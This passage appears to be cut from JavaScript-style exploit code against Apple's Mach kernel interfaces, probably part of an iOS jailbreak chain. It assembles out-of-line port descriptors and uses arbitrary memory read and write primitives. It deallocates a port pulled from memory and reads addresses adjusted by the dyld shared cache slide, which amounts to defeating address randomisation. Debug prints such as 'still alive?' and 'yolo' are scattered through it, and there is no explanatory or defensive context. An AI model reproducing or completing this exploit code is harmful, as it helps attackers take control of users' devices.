
	
//	new_buf_.push(tmp[0]);
//	new_buf_.push(tmp[1]);
//	new_buf_.push(tmp[2]);
//	new_buf_.push(tmp[3]);
//	tmp = u32_to_u8x4(num);
//	new_buf_.push(tmp[0]);
//	new_buf_.push(tmp[1]);
//	new_buf_.push(tmp[2]);
//	new_buf_.push(tmp[3]);
//	new_buf_.push(0);
//	new_buf_.push(0);
//	new_buf_.push(MACH_MSG_OOL_PORTS_DESCRIPTOR);
//	new_buf_.push(19);

//	printf("%x 0x%08x,0x%08x,0x%08x,0x%08x,0x%08x,0x%08x,0x%08x,0x%08x,0x%08x,0x%08x,0x%08x,0x%08x,0x%08x,0x%08x,0x%08x,0x%08x,\n", new_buf_.length, new_buf_[zz]]);

//	var new_buf = fast_array_mul(new_buf_, number_port_descs);

	/*
	for (var i = 0; i < number_port_descs; i++) {
		write_u32(buf + (req_init_port_set * (i + 1)) + req_init_port_set_address, init_port_set);
		write_u32(buf + (req_init_port_set * (i + 1)) + req_init_port_set_count, num);
		write_u8(buf + (req_init_port_set * (i + 1)) + 0x8, 0);
		write_u8(buf + (req_init_port_set * (i + 1)) + 0xa, 19);
		write_u8(buf + (req_init_port_set * (i + 1)) + 0xb, MACH_MSG_OOL_PORTS_DESCRIPTOR);
	}*/

//	var tmp = u32_to_u8x4(init_port_set);
printf("still alive? %x\n", 420);
printf("still still alive?\n");
printf("yolo\n");
printf("%x\n", o);

mach_port_deallocate(self, read_u32(data));
write_u32(data, MACH_PORT_NULL);
printf("%x %x\n", master, read_u32(master));
printf("%x\n", read_u32(0x36ebf00c + get_dyld_shc_slide()));
printf("still alive? %x %x\n", err, read_u32(err));
printf("still alive? %x %x\n", err, read_u32(err));
